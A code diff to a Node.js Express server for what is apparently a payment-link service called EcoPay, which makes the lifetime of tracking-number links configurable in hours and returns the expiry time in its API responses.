@@ -17,7 +17,6 @@ const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 const SESSION_TTL_MS = 60 * 60 * 1000;
-const LINK_TTL_MS    = 30 * 60 * 1000;
 
 const DATA_DIR      = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
 const SESSIONS_FILE = path.join(DATA_DIR, 'ecopay_sessions.json');
@@ -191,6 +190,7 @@ app.post('/api/links', (req, res) => {
     const tracking = String(body.trackingNumber || body.t || '').trim().toUpperCase();
     if (!tracking) return res.status(400).json({ ok:false, error:'Tracking number required' });
     const now = Date.now();
+    const expiryHours = parseInt(body.expiryHours, 10) || 6;
     const record = {
       trackingNumber: tracking,
       accountName: body.accountName || '',
@@ -203,16 +203,18 @@ app.post('/api/links', (req, res) => {
       modeOfPayment: body.modeOfPayment || '',
       receiptOptional: body.receiptOptional || '',
       timestamp: body.timestamp || '',
+      expiryHours: expiryHours,
       createdAt: now,
-      expiresAt: now + LINK_TTL_MS
+      expiresAt: now + expiryHours * 60 * 60 * 1000
     };
     links.set(tracking, record);
     persistLinks();
-    console.log(`[link] created ${tracking}`);
+    console.log(`[link] created ${tracking} (expires in ${expiryHours}h)`);
     res.json({
       ok: true,
       code: tracking,
       trackingNumber: tracking,
+      expiryHours: expiryHours,
       expiresAt: record.expiresAt
     });
   } catch (err) { res.status(500).json({ ok:false, error: err.message }); }
@@ -229,7 +231,7 @@ app.get('/api/links/:code', (req, res) => {
   if (!rec) return res.status(404).json({ ok:false, error:'Link not found' });
   if (rec.expiresAt && Date.now() > rec.expiresAt) {
     links.delete(code); persistLinks();
-    return res.status(410).json({ ok:false, error:'Link expired' });
+    return res.status(410).json({ ok:false, error:'Link expired', expiresAt: rec.expiresAt });
   }
   // Return both long names AND short aliases so index.html + pay.html work
   res.json({
